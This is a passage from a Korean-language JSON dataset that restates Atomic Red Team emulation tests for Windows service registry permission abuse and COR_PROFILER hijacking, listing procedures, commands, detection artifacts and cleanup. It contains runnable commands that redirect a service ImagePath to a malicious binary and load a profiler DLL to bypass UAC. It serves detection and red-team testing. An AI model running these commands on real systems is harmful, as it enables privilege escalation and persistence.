            "name": "windows_service.exe",
            "description": "의도된 서비스 실행 파일로, 실제 경로는 C:\\Program Files\\windows_service.exe이지만 Unquoted 경로 설정 시 우선되지 않을 수 있다.",
            "commandline_pattern": "C:\\Program Files\\windows_service.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "sc stop \"Example Service\" >nul 2>&1 명령으로 Example Service를 중지한다.",
        "sc delete \"Example Service\" >nul 2>&1 명령으로 Example Service 서비스를 삭제한다.",
        "\"C:\\Program Files\\windows_service.exe\" 파일을 삭제한다.",
        "\"C:\\program.exe\" 파일을 삭제한다.",
        "\"C:\\Time.log\" 파일을 삭제한다(존재하는 경우)."
      ],

      "metadata": {
        "atomic_source_id": "2770dea7-c50f-457b-84c4-c40a47460d9f"
      }
    }
  ]
},
{
  "technique_id": "T1574.011",
  "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
  "tactic": "Privilege Escalation",

  "description": "서비스 레지스트리 키의 권한이 과도하게 완화되어 있을 경우, 공격자가 ImagePath 등의 값을 수정해 임의 실행 파일을 SYSTEM 권한으로 실행시키는 기법이다. 정상 서비스의 레지스트리 권한을 악용해 바이너리 경로를 악성 프로그램으로 교체함으로써 권한 상승과 지속성을 동시에 달성할 수 있다. 이때 레지스트리 ACL(Access Control List) 검사는 탐지·점검 측면에서 핵심 단서가 된다.",

  "tests": [
    {
      "test_id": "T1574.011-1",
      "name": "Service Registry Permissions Weakness",
      "platforms": ["windows"],

      "summary": "서비스 레지스트리 키의 권한(ACL)을 열람해, 일반 사용자 또는 비관리자 계정이 수정 가능한 취약 서비스가 존재하는지 확인하는 시나리오이다. 취약한 서비스 키를 찾으면 이후 ImagePath 변경을 통한 권한 상승으로 이어질 수 있다.",

      "procedure": [
        "PowerShell을 관리자 권한 또는 적절한 권한으로 실행한다.",
        "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL 명령으로 모든 서비스 키의 ACL 정보를 확인한다.",
        "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL 명령으로 특정 취약 서비스(<weak_service_name>)의 권한 구성을 상세히 확인한다.",
        "ACL 정보에서 Authenticated Users, Users 등 일반 계정에 대한 SetValue/FullControl 권한이 있는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* | FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> | FL"
        }
      ],

      "prerequisites": [
        "테스트 대상 Windows 시스템에 PowerShell이 설치되어 있어야 한다.",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services 레지스트리 키를 열람할 수 있는 권한이 필요하다(일반적으로 읽기 권한은 대부분 계정에 허용됨).",
        "분석 대상이 될 서비스 이름(<weak_service_name>)을 알고 있어야 한다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>",
            "description": "권한(ACL)을 점검한 취약 서비스 레지스트리 키. 향후 ImagePath 변경 시 악용 가능."
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "서비스 레지스트리 키의 ACL 정보를 조회하는 PowerShell 프로세스",
            "commandline_pattern": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "이 테스트는 레지스트리 키를 읽기만 하므로 별도의 클린업 작업이 필요하지 않다.",
        "필요 시 PowerShell 세션을 종료한다."
      ],

      "metadata": {
        "atomic_source_id": "f7536d63-7fd4-466f-89da-7e48d550752a"
      }
    },
    {
      "test_id": "T1574.011-2",
      "name": "Service ImagePath Change with reg.exe",
      "platforms": ["windows"],

      "summary": "권한이 취약한 서비스의 ImagePath 레지스트리 값을 악성 실행 파일 경로로 변경하는 시나리오이다. 먼저 benign 서비스(<weak_service_path>)로 서비스를 생성한 뒤, reg.exe를 사용해 해당 서비스의 ImagePath를 악성 경로(<malicious_service_path>, 기본 cmd.exe)로 교체한다. 이후 서비스가 시작되면 악성 경로가 서비스 권한(잠재적으로 SYSTEM)으로 실행될 수 있다.",

      "procedure": [
        "테스트에 사용할 취약 서비스 이름(<weak_service_name>), 원래 서비스 경로(<weak_service_path>), 악성 서비스 경로(<malicious_service_path>)를 결정한다.",
        "사전 조건 스크립트를 통해 <weak_service_name> 서비스가 존재하는지 확인하고, 없으면 sc.exe create <weak_service_name> binpath= \"<weak_service_path>\" 명령으로 benign 서비스를 생성한다.",
        "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\" 명령으로 ImagePath 값을 악성 경로로 변경한다.",
        "이후(테스트 외부 단계) 서비스 <weak_service_name>를 시작하면, 설정된 <malicious_service_path>가 서비스 권한으로 실행될 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" /f /v ImagePath /d \"<malicious_service_path>\""
        }
      ],

      "prerequisites": [
        "<weak_service_name> 서비스가 시스템에 존재해야 한다(없을 경우 sc.exe create <weak_service_name> binpath= \"<weak_service_path>\" 로 생성).",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name> 레지스트리 키에 ImagePath 값을 변경할 수 있는 권한이 필요하다(일반적으로 관리자/ SYSTEM 또는 취약 권한이 부여된 사용자).",
        "악성 경로로 지정할 실행 파일(<malicious_service_path>, 기본 %windir%\\system32\\cmd.exe)이 존재해야 한다.",
        "reg.exe 및 sc.exe 명령을 실행할 수 있는 콘솔 환경(관리자 권한)이 필요하다."
      ],

      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>",
            "description": "ImagePath 값이 benign 경로에서 악성 경로(<malicious_service_path>)로 변경된 서비스 레지스트리 키"
          }
        ],
        "processes": [
          {
            "name": "reg.exe",
            "description": "서비스 레지스트리 키의 ImagePath 값을 수정하는 유틸리티",
            "commandline_pattern": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<weak_service_name>\" * /v ImagePath /d *"
          },
          {
            "name": "sc.exe",
            "description": "사전 조건에서 테스트용 취약 서비스를 생성 또는 삭제하는 서비스 제어 유틸리티",
            "commandline_pattern": "sc.exe create <weak_service_name> binpath=*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "sc.exe delete <weak_service_name> 명령으로 테스트에 사용한 서비스를 삭제한다.",
        "필요 시 HKLM\\SYSTEM\\CurrentControlSet\\Services 아래에서 <weak_service_name> 관련 레지스트리 키가 완전히 제거되었는지 확인한다."
      ],

      "metadata": {
        "atomic_source_id": "f38e9eea-e1d7-4ba6-b716-584791963827"
      }
    }
  ]
},
{
  "technique_id": "T1574.012",
  "technique_name": "Hijack Execution Flow: COR_PROFILER",
  "tactic": "Privilege Escalation",

  "description": "COR_PROFILER 기법은 .NET CLR 프로파일러 환경 변수와 COM CLSID를 악용해, CLR이 로드될 때 공격자가 지정한 프로파일러 DLL을 먼저 로드하도록 만드는 방법이다. 공격자는 Event Viewer, PowerShell 등 고무결(High Integrity) 프로세스의 CLR 로딩 시점을 가로채 임의 코드를 실행하고, UAC 우회 또는 권한 상승과 지속성 확보에 활용할 수 있다. 사용자/시스템/프로세스 범위 환경 변수 설정 등 다양한 변종이 존재한다.",

  "tests": [
    {
      "test_id": "T1574.012-1",
      "name": "User scope COR_PROFILER",
      "platforms": ["windows"],

      "summary": "사용자 범위(HKCU)에서 COR_PROFILER 관련 레지스트리와 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. 커스텀 CLSID와 프로파일러 DLL 경로를 HKCU에 등록하고, Event Viewer(eventvwr.msc)를 실행해 CLR이 로드될 때 프로파일러 DLL(T1574.012x64.dll)이 로드되도록 유도한다. 로컬 관리자 계정일 경우 UAC를 우회해 notepad.exe가 높은 무결성(High Integrity)으로 실행될 수 있다.",

      "procedure": [
        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건 단계에서 GitHub에서 다운로드).",
        "PowerShell에서 HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32 키를 생성하고 기본값으로 <file_name> 경로를 설정한다.",
        "HKCU:\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 환경 변수 값을 생성한다.",
        "MMC.EXE EVENTVWR.MSC 명령을 실행해 Event Viewer를 실행하고, CLR 로딩 시 프로파일러 DLL이 호출되는지(예: notepad.exe 실행 여부) 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\<clsid_guid>\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32\" -Value \"<file_name>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC"
        }
      ],

      "prerequisites": [
        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다(없으면 Atomic Red Team GitHub에서 다운로드해 저장).",
        "테스트를 실행하는 계정으로 HKCU:\\Software\\Classes 및 HKCU:\\Environment에 레지스트리 키/값을 생성할 수 있어야 한다.",
        "테스트 환경에 MMC 및 Event Viewer(EVENTVWR.MSC)가 존재해야 한다.",
        "UAC 우회를 관찰하려면 테스트 계정이 로컬 관리자 그룹에 속해 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "<file_name>",
            "description": "COR_PROFILER로 로드될 비관리 프로파일러 DLL(T1574.012x64.dll)"
          }
        ],
        "files_read": [
          {
            "path": "<file_name>",
            "description": "CLR 로딩 시 InprocServer32로 지정된 경로에서 로드되는 프로파일러 DLL"
          }
        ],
        "registry_keys": [
          {
            "path": "HKCU\\Software\\Classes\\CLSID\\<clsid_guid>\\InprocServer32",
            "description": "COM CLSID에 대한 InprocServer32 경로로 프로파일러 DLL을 지정하는 키"
          },
          {
            "path": "HKCU\\Environment",
            "description": "COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH 사용자 환경 변수가 설정된 키"
          }
        ],
        "processes": [
          {
            "name": "mmc.exe",
            "description": "EVENTVWR.MSC를 로드하면서 CLR을 호출하고, 그 과정에서 COR_PROFILER DLL을 로드하는 프로세스",
            "commandline_pattern": "MMC.EXE EVENTVWR.MSC"
          },
          {
            "name": "notepad.exe",
            "description": "프로파일러 DLL 로직에 의해 실행되는 페이로드 프로세스(높은 무결성 레벨로 실행될 수 있음)",
            "commandline_pattern": "notepad.exe"
          },
          {
            "name": "powershell.exe",
            "description": "레지스트리 및 환경 변수 설정, Event Viewer 실행을 담당하는 PowerShell 프로세스",
            "commandline_pattern": "*COR_PROFILER*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\<clsid_guid>\" -Recurse -Force -ErrorAction Ignore 명령으로 CLSID 키를 제거한다.",
        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null",
        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null",
        "Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
        "필요 시 <file_name> DLL 파일도 수동으로 삭제한다."
      ],

      "metadata": {
        "atomic_source_id": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a"
      }
    },
    {
      "test_id": "T1574.012-2",
      "name": "System Scope COR_PROFILER",
      "platforms": ["windows"],

      "summary": "시스템 범위(HKLM) 환경 변수에 COR_PROFILER를 설정해, CLR이 어느 프로세스에서든 로드될 때 프로파일러 DLL이 실행되도록 만드는 시나리오이다. 세션 관리자(Environment) 키에 COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH를 등록하며, 시스템 재부팅 후 모든 .NET 프로세스가 해당 프로파일러를 로드할 수 있다. Event Viewer 등 고무결 프로세스 실행 시 UAC 우회 및 고권한 notepad.exe 실행이 가능하다.",

      "procedure": [
        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드).",
        "PowerShell을 관리자 권한으로 실행한다.",
        "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 경로에 COR_ENABLE_PROFILING=1, COR_PROFILER=<clsid_guid>, COR_PROFILER_PATH=<file_name> 시스템 환경 변수를 추가한다.",
        "변경 사항을 완전히 적용하려면 시스템을 재부팅한다.",
        "재부팅 후 Event Viewer 또는 다른 .NET 기반 애플리케이션을 실행해 프로파일러 DLL이 로드되고 페이로드가 실행되는지 확인한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"<clsid_guid>\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"<file_name>\" -Force | Out-Null"
        }
      ],

      "prerequisites": [
        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다(없으면 GitHub에서 다운로드).",
        "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 키에 쓰기 가능한 관리자 권한이 필요하다.",
        "해당 변경 사항이 적용되도록 시스템 재부팅이 가능해야 한다.",
        ".NET 런타임이 설치되어 있고, 재부팅 후 CLR을 사용하는 프로세스가 실제로 실행되어야 효과를 관찰할 수 있다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "<file_name>",
            "description": "시스템 전체에서 로드될 프로파일러 DLL"
          }
        ],
        "files_read": [
          {
            "path": "<file_name>",
            "description": "CLR 로딩 시 system-wide COR_PROFILER_PATH를 통해 참조되는 DLL"
          }
        ],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
            "description": "COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH 시스템 환경 변수가 설정된 키"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "시스템 범위 환경 변수를 설정하는 PowerShell 프로세스",
            "commandline_pattern": "*COR_ENABLE_PROFILING*"
          }
        ],
        "network": []
      },

      "cleanup": [
        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null",
        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null",
        "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null",
        "필요 시 시스템 재부팅을 통해 변경된 환경 변수를 초기화된 상태에서 재적용하도록 한다(삭제 후)."
      ],

      "metadata": {
        "atomic_source_id": "f373b482-48c8-4ce4-85ed-d40c8b3f7310"
      }
    },
    {
      "test_id": "T1574.012-3",
      "name": "Registry-free process scope COR_PROFILER",
      "platforms": ["windows"],

      "summary": "레지스트리 변경 없이, 현재 프로세스 범위에서만 COR_PROFILER 환경 변수를 설정해 .NET 프로파일러를 활성화하는 시나리오이다. PowerShell 세션 내에서 환경 변수를 설정한 후, 동일 세션에서 PowerShell -c 'Start-Sleep 1'을 실행해 CLR을 로드하고 프로파일러 DLL(T1574.012x64.dll)이 실행되도록 한다. 디스크/레지스트리 흔적을 최소화한 단발성 실행·테스트에 유용하다.",

      "procedure": [
        "<file_name> 위치에 T1574.012x64.dll 프로파일러 DLL이 존재하는지 확인한다(없으면 사전 조건에서 다운로드).",
        "PowerShell에서 $env:COR_ENABLE_PROFILING = 1, $env:COR_PROFILER = '<clsid_guid>', $env:COR_PROFILER_PATH = '\"<file_name>\"' 값을 설정한다.",
        "동일한 PowerShell 세션에서 POWERSHELL -c 'Start-Sleep 1' 명령을 실행해 하위 PowerShell 프로세스에서 CLR을 로드한다.",
        "프로파일러 DLL이 로드되어 페이로드가 실행되는지(예: notepad.exe 실행, 기타 동작) 관찰한다.",
        "테스트 후 환경 변수를 초기화해($env:COR_* 값 리셋) 추가 CLR 로딩 시 더 이상 프로파일러가 사용되지 않도록 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '<clsid_guid>'\n$env:COR_PROFILER_PATH = '\"<file_name>\"'\nPOWERSHELL -c 'Start-Sleep 1'"
        }
      ],

      "prerequisites": [
        "<file_name> 경로에 프로파일러 DLL(T1574.012x64.dll)이 존재해야 한다.",
        "PowerShell 환경에서 프로세스 범위 환경 변수를 설정할 수 있어야 한다.",
        "테스트 중에만 유효한 일시적 설정이므로, 같은 PowerShell 세션 안에서 CLR을 사용하는 명령을 실행해야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "<file_name>",
            "description": "Process scope에서 로드될 프로파일러 DLL"
          }
        ],
        "files_read": [
          {
            "path": "<file_name>",
            "description": "하위 PowerShell 프로세스에서 CLR 로딩 시 참조되는 DLL"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "환경 변수를 설정하고 하위 PowerShell 프로세스를 실행해 CLR을 로드하는 프로세스",
            "commandline_pattern": "POWERSHELL -c 'Start-Sleep 1'"
          }
        ],
        "network": []
      },

      "cleanup": [
        "$env:COR_ENABLE_PROFILING = 0",
        "$env:COR_PROFILER = ''",
        "$env:COR_PROFILER_PATH = ''",
        "해당 PowerShell 세션을 종료해 프로세스 범위 환경 변수를 완전히 정리한다."
      ],

      "metadata": {
        "atomic_source_id": "79d57242-bbef-41db-b301-9d01d9f6e817"
      }
    }
  ]
}






]